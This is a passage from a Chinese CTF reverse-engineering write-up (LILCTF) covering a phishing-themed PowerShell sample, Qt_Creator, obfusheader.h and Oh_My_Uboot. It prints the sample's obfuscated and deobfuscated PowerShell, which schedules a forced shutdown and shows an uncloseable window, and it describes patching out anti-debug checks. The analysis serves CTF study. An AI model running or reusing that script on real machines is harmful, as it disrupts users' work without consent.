class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$e</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$i</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span> ) &#125; &#123; <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$q</span> *( <span class="hljs-variable">$z</span>) ) &#125; &#123; <span class="hljs-variable">$l</span> = (<span class="hljs-variable">$r</span> = <span class="hljs-variable">$r</span> + <span class="hljs-variable">$b</span>) &#125; &#123; <span class="hljs-variable">$g</span> = <span class="hljs-string">&quot;[&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;)&quot;</span>[<span class="hljs-variable">$e</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;)&quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125; ) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$q</span><span class="hljs-variable">$u</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>?&quot;</span>[<span class="hljs-variable">$b</span> ] + <span class="hljs-string">&quot;]&quot;</span> &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;&quot;</span>.(<span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123;&#125; ) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>&quot;</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125;) &quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span><span class="hljs-variable">$h</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123; &#125; )&quot;</span>[<span class="hljs-variable">$u</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123;&#125; )&quot;</span>[<span class="hljs-variable">$o</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>? &quot;</span>[ <span class="hljs-variable">$b</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>( @&#123;&#125;)&quot;</span>[<span class="hljs-variable">$z</span> ]) &#125; &#123; <span class="hljs-variable">$r</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125; )&quot;</span>[ <span class="hljs-string">&quot;<span class="hljs-variable">$b</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$o</span>&quot;</span>] + <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(@&#123; &#125;) &quot;</span>[<span class="hljs-variable">$o</span> ] + <span class="hljs-string">&quot;<span class="hljs-variable">$r</span>&quot;</span>[<span class="hljs-string">&quot;<span class="hljs-variable">$q</span>&quot;</span> + <span class="hljs-string">&quot;<span class="hljs-variable">$e</span>&quot;</span> ] &#125; ) ; <span class="hljs-string">&quot; <span class="hljs-variable">$r</span> (<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>......</span><br></code></pre></td></tr></table></figure>
+
+<p>这一串就是加密的过程，<code>$r</code> 是核心变量。</p>
+<p>最终结果</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$DebugPreference</span> = <span class="hljs-variable">$ErrorActionPreference</span> = <span class="hljs-variable">$VerbosePreference</span> = <span class="hljs-variable">$WarningPreference</span> = <span class="hljs-string">&quot;SilentlyContinue&quot;</span><br><br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Windows.Forms&quot;</span>)<br>[<span class="hljs-built_in">void</span>] [<span class="hljs-type">System.Reflection.Assembly</span>]::LoadWithPartialName(<span class="hljs-string">&quot;System.Drawing&quot;</span>)<br><br>shutdown /s /t <span class="hljs-number">600</span> &gt;<span class="hljs-variable">$Null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br><br><span class="hljs-variable">$Form</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Form<br><span class="hljs-variable">$Form</span>.Text = <span class="hljs-string">&quot;Ciallo～(∠·ω&lt; )⌒★&quot;</span><br><span class="hljs-variable">$Form</span>.StartPosition = <span class="hljs-string">&quot;Manual&quot;</span><br><span class="hljs-variable">$Form</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">40</span>, <span class="hljs-number">40</span>)<br><span class="hljs-variable">$Form</span>.Size = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MinimalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.MaximalSize = <span class="hljs-built_in">New-Object</span> System.Drawing.Size(<span class="hljs-number">720</span>, <span class="hljs-number">480</span>)<br><span class="hljs-variable">$Form</span>.FormBorderStyle = <span class="hljs-string">&quot;FixedDialog&quot;</span><br><span class="hljs-variable">$Form</span>.BackColor = <span class="hljs-string">&quot;#0077CC&quot;</span><br><span class="hljs-variable">$Form</span>.MaximizeBox = <span class="hljs-variable">$False</span><br><span class="hljs-variable">$Form</span>.TopMost = <span class="hljs-variable">$True</span><br><br><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;LILCTF&#123;be_vigilant_against_phishing&#125;&quot;</span><br><span class="hljs-variable">$fF1IA49G</span> = <span class="hljs-string">&quot;N0pe&quot;</span><br><br><br><span class="hljs-variable">$Label1</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label1</span>.Text = <span class="hljs-string">&quot;:)&quot;</span><br><span class="hljs-variable">$Label1</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">80</span>)<br><span class="hljs-variable">$Label1</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label1</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label1</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;Consolas&quot;</span>, <span class="hljs-number">64</span>)<br><br><span class="hljs-variable">$Label2</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label2</span>.Text = <span class="hljs-string">&quot;这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里&quot;</span><br><span class="hljs-variable">$Label2</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">240</span>)<br><span class="hljs-variable">$Label2</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label2</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label2</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Label3</span> = <span class="hljs-built_in">New-Object</span> System.Windows.Forms.Label<br><span class="hljs-variable">$Label3</span>.Text = <span class="hljs-string">&quot;你的电脑将在 10 分钟后关机，请保存你的工作&quot;</span><br><span class="hljs-variable">$Label3</span>.Location = <span class="hljs-built_in">New-Object</span> System.Drawing.Point(<span class="hljs-number">64</span>, <span class="hljs-number">300</span>)<br><span class="hljs-variable">$Label3</span>.AutoSize = <span class="hljs-variable">$True</span><br><span class="hljs-variable">$Label3</span>.ForeColor = <span class="hljs-string">&quot;White&quot;</span><br><span class="hljs-variable">$Label3</span>.Font = <span class="hljs-built_in">New-Object</span> System.Drawing.Font(<span class="hljs-string">&quot;微软雅黑&quot;</span>, <span class="hljs-number">16</span>)<br><br><span class="hljs-variable">$Form</span>.Controls.AddRange(<span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$Label1</span>, <span class="hljs-variable">$Label2</span>, <span class="hljs-variable">$Label3</span>))<br><br><span class="hljs-variable">$Form</span>.Add_Shown(&#123;<span class="hljs-variable">$Form</span>.Activate()&#125;)<br><span class="hljs-variable">$Form</span>.Add_FormClosing(&#123;<br>    <span class="hljs-variable">$_</span>.Cancel = <span class="hljs-variable">$True</span><br>    [<span class="hljs-type">System.Windows.Forms.MessageBox</span>]::Show(<span class="hljs-string">&quot;不允许关闭！&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, [<span class="hljs-type">System.Windows.Forms.MessageBoxButtons</span>]::OK, [<span class="hljs-type">System.Windows.Forms.MessageBoxIcon</span>]::Information)<br>&#125;)<br><br><span class="hljs-variable">$Form</span>.ShowDialog() | <span class="hljs-built_in">Out-Null</span><br></code></pre></td></tr></table></figure>
+
+<p>LILCTF{be_vigilant_against_phishing}</p>
+<h2 id="Qt-Creator"><a href="#Qt-Creator" class="headerlink" title="Qt_Creator"></a>Qt_Creator</h2><p>题目给的是一个安装包，下载下来后直接安装文件，就是一个登录的页面，要求输入注册码，注册码就是flag，所以解题的思路就是通过分析安装得到的文件得到注册码</p>
+<p>整体来说这个题目难度不大，但是需要一步步动调来确定输入函数的位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206409.png" srcset="/img/loading.gif" lazyload alt="image-20250820005109524"></p>
+<p>安装好的demo_code_editor.exe打开拖入ida</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200048966.png" srcset="/img/loading.gif" lazyload alt="image-20250820004857888"></p>
+<p>我们直接进入ida时看到的主函数入口是winmain，也可以从那里开始进行调试，这道题就是动调找主要函数的过程。</p>
+<p>如果没有什么思路，我们就可以直接从start函数这里开始调试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207769.png" srcset="/img/loading.gif" lazyload alt="image-20250820004740860"></p>
+<p>进入sub_401150函数，我们可以利用动调或者直接分析函数内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206400.png" srcset="/img/loading.gif" lazyload alt="image-20250820005827378"></p>
+<p>sub_417C00就是入口函数，点进去也能看到这个窗口程序的主函数winmain</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200101149.png" srcset="/img/loading.gif" lazyload alt="image-20250820010117080"></p>
+<p>可以在函数开头下断点，然后f8一步步动调</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200103384.png" srcset="/img/loading.gif" lazyload alt="image-20250820010341303"></p>
+<p>发现在sub_4015E0函数处就直接退出了，说明有反调试</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207412.png" srcset="/img/loading.gif" lazyload alt="image-20250820010432571"></p>
+<p>可以在反调试的跳转函数那里下断点，在动调的时候改zf，或者直接将jz改为jmp（74改为EB）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206270.png" srcset="/img/loading.gif" lazyload alt="image-20250820010446802"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207226.png" srcset="/img/loading.gif" lazyload alt="image-20250820010938002"></p>
+<p>顺便把exit退出函数给nop掉，然后patch保存，这样就顺利地反反调试了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200206365.png" srcset="/img/loading.gif" lazyload alt="image-20250820011418960"></p>
+<p>继续调试，发现程序在运行到sub_403400函数的时候跳出让用户输入注册码，随便输入之后发现程序就直接退出了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207332.png" srcset="/img/loading.gif" lazyload alt="image-20250820011626032"></p>
+<p>重新调试，在sub_403400函数下断点然后f7进去一步步调试，发现在QDialog::exec这里让用户输入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200141258.png" srcset="/img/loading.gif" lazyload alt="image-20250820011955496"></p>
+<p>重新调试，进入QDialog::exec函数一步步调试<img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200136669.png" srcset="/img/loading.gif" lazyload alt="image-20250820013636591"></p>
+<p>在调试的过程中也可以发现QDialog::exec函数其实是一个窗口生成和输入的函数，在这里的调试过程中随便输入验证不会跳出exit，说明我们没有触碰到exit，也说明我们快接近验证字符串的函数部分了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200143267.png" srcset="/img/loading.gif" lazyload alt="image-20250820014308177"></p>
+<p>继续动调，一直到最后看到的退出exit函数，这里没什么技巧，一直f8</p>
+<p>直接跟踪这个函数，于是发现了sub_410100函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207773.png" srcset="/img/loading.gif" lazyload alt="image-20250820013052924"></p>
+<p>发现这里的QLineEdit::text() → 得到输入的字符串（Qt 的QString），这个函数就是用来验证输入的字符串的，我们成功找到了真正的flag存在的位置，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200207376.png" srcset="/img/loading.gif" lazyload alt="image-20250820013233998"></p>
+<p>在 QLineEdit::text(*(a1[6] + 20));下断点重新调试</p>
+<p>然后再次在QDialog::exec函数输入注册码之后就会跳转到sub_410100，然后再返回看a1的内容，就能得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508200155829.png" srcset="/img/loading.gif" lazyload alt="image-20250820015506728"></p>
+<p>LILCTF{Q7_cre4t0r_1s_very_c0nv3ni3nt}</p>
+<h2 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a><strong>obfusheader.h</strong></h2><p>这题本来想去除花指令，就是一个jz跳转的花指令，但是有点多，就没有去除，好在汇编不太难，可以直接看出加密逻辑</p>
+<p>可以通过搜索字符串找到关键函数的位置，也可以在初始函数这里找到（做过好多道题，一般都会在start函数里的code处是主函数入口）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236627.png" srcset="/img/loading.gif" lazyload alt="image-20250827223612464"></p>
+<p>在输入flag这里下断点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272236128.png" srcset="/img/loading.gif" lazyload alt="image-20250827223629947"></p>
+<p>这里如果输入的字符串长度不对就会直接退出，可以通过调试发现寄存器rax为0x28，长度为40，然后输入之后下硬件断点</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272239519.png" srcset="/img/loading.gif" lazyload alt="image-20250827223926343"></p>
+<p>第一次调试直接按f9，到这里，这里就是一个比较长度的函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203539.png" srcset="/img/loading.gif" lazyload alt="image-20250827220320351"></p>
+<p>这里两次调试是与一个随机数异或</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272203463.png" srcset="/img/loading.gif" lazyload alt="image-20250827220338332"></p>
+<p>将xor结束后的测试密文提取出来得到随机数xor的key</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272229434.png" srcset="/img/loading.gif" lazyload alt="image-20250827222911255"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key</span>[]=&#123;<span class="hljs-number">0</span>x76,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>xf8,<span class="hljs-number">0</span>x50,<span class="hljs-number">0</span>xa7,<span class="hljs-number">0</span>x43,<span class="hljs-number">0</span>xc8,<span class="hljs-number">0</span>x33,<span class="hljs-number">0</span>x87,<span class="hljs-number">0</span>x67,<span class="hljs-number">0</span>xd4,<span class="hljs-number">0</span>x69,<span class="hljs-number">0</span>x7e,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x41,<span class="hljs-number">0</span>x61,<span class="hljs-number">0</span>x64,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xa5,<span class="hljs-number">0</span>x0f,<span class="hljs-number">0</span>x13,<span class="hljs-number">0</span>x4d,<span class="hljs-number">0</span>xa9,<span class="hljs-number">0</span>x7f,<span class="hljs-number">0</span>xf9,<span class="hljs-number">0</span>x21,<span class="hljs-number">0</span>xc0,<span class="hljs-number">0</span>x5c,<span class="hljs-number">0</span>x76,<span class="hljs-number">0</span>x17,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x75,<span class="hljs-number">0</span>xfd,<span class="hljs-number">0</span>x01,<span class="hljs-number">0</span>x4c,<span class="hljs-number">0</span>x33&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第四次调试，我没有去除花指令，但也不太影响看汇编，这里就是位运算，将高四位和低四位调换位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272250249.png" srcset="/img/loading.gif" lazyload></p>
+<p>第五次调试，这里就是按位取反</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272251990.png" srcset="/img/loading.gif" lazyload alt="image-20250827225146843"></p>
+<p>第六次到这里，cmp比较指令，可以得到密文</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508272245175.png" srcset="/img/loading.gif" lazyload alt="image-20250827224524025"></p>
+<p>提取出的密文：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">enc</span>[]=&#123;<span class="hljs-number">0</span>x5C,<span class="hljs-number">0</span>xAF,<span class="hljs-number">0</span>xB0,<span class="hljs-number">0</span>x1C,<span class="hljs-number">0</span>xFC,<span class="hljs-number">0</span>xEF,<span class="hljs-number">0</span>xC7,<span class="hljs-number">0</span>x8D,<span class="hljs-number">0</span>x1,<span class="hljs-number">0</span>x88,<span class="hljs-number">0</span>x36,<span class="hljs-number">0</span>x39,<span class="hljs-number">0</span>x11,<span class="hljs-number">0</span>xBE,<span class="hljs-number">0</span>x47,<span class="hljs-number">0</span>x2F,<span class="hljs-number">0</span>x5B,<span class="hljs-number">0</span>x48,<span class="hljs-number">0</span>xFD,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>x2D,<span class="hljs-number">0</span>xF8,<span class="hljs-number">0</span>xD0,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>xFA,<span class="hljs-number">0</span>x3F,<span class="hljs-number">0</span>x81,<span class="hljs-number">0</span>xFD,<span class="hljs-number">0</span>xA6,<span class="hljs-number">0</span>x9E,<span class="hljs-number">0</span>x6,<span class="hljs-number">0</span>x59,<span class="hljs-number">0</span>xCE,<span class="hljs-number">0</span>x7B,<span class="hljs-number">0</span>x40,<span class="hljs-number">0</span>xBE,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>xBB,<span class="hljs-number">0</span>xDF,<span class="hljs-number">0</span>x1B&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">key = [<span class="hljs-number">0x76</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x43</span>,<br>       <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x61</span>,<br>       <span class="hljs-number">0x64</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x21</span>,<br>       <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x33</span>]<br><br>enc = [<span class="hljs-number">0x5C</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x88</span>,<br>       <span class="hljs-number">0x36</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFA</span>,<br>       <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x9E</span>,<br>       <span class="hljs-number">0x06</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x1B</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">swap_high_low4</span>(<span class="hljs-params">byte</span>):<br>    high_4 = byte &gt;&gt; <span class="hljs-number">4</span><br>    low_4 = byte &amp; <span class="hljs-number">0x0F</span><br>    <span class="hljs-keyword">return</span> (low_4 &lt;&lt; <span class="hljs-number">4</span>) | high_4<br><br>plaintext_bytes = []<br><span class="hljs-keyword">for</span> e_byte, k_byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(enc, key):<br>    not_e = e_byte ^ <span class="hljs-number">0xFF</span><br>    swapped = swap_high_low4(not_e)<br>    plain_byte = swapped ^ k_byte<br>    plaintext_bytes.append(plain_byte)<br><br>plaintext = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> plaintext_bytes])<br><span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure>
+
+<p>LILCTF{wH4T_is_d47a1I0W_CAN_l7_6e_eaTEN}</p>
+<h2 id="Oh-My-Uboot"><a href="#Oh-My-Uboot" class="headerlink" title="Oh_My_Uboot"></a><strong>Oh_My_Uboot</strong></h2><p>看官方的wp利用qemu进行调试来着，这个方法我还没试，可能出题人忘记隐藏字符串了~</p>
+<p>可以通过搜索字符串直接找到关键密文</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280109207.png" srcset="/img/loading.gif" lazyload alt="image-20250828010908027"></p>
+<p>然后交叉引用找到主函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508280110775.png" srcset="/img/loading.gif" lazyload alt="image-20250828011057625"></p>
+<p>unk_6086D357数据会被sub_60813F74解密，这部分应该输出类似英文提示信息</p>
+<p>核心校验函数 <code>sub_60813E3C</code>，生成自定义的base58表</p>
+<p>生成的表是</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[<span class="hljs-string">\]^_`abcdefghi</span><br></code></pre></td></tr></table></figure>
+
+<p>最后不要忘记xor 72！！</p>
+<p>完整脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">alphabet = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>, <span class="hljs-number">0x30</span>+<span class="hljs-number">58</span>))<br>decode_map = &#123;c: i <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alphabet)&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_base58_decode</span>(<span class="hljs-params">s</span>):<br>    num = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s:<br>        num = num * <span class="hljs-number">58</span> + decode_map[ch]<br>    out = []<br>    <span class="hljs-keyword">while</span> num &gt; <span class="hljs-number">0</span>:<br>        out.append(num &amp; <span class="hljs-number">0xFF</span>)<br>        num &gt;&gt;= <span class="hljs-number">8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">reversed</span>(out))<br><br>cipher = <span class="hljs-string">&quot;5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;&quot;</span><br>decoded 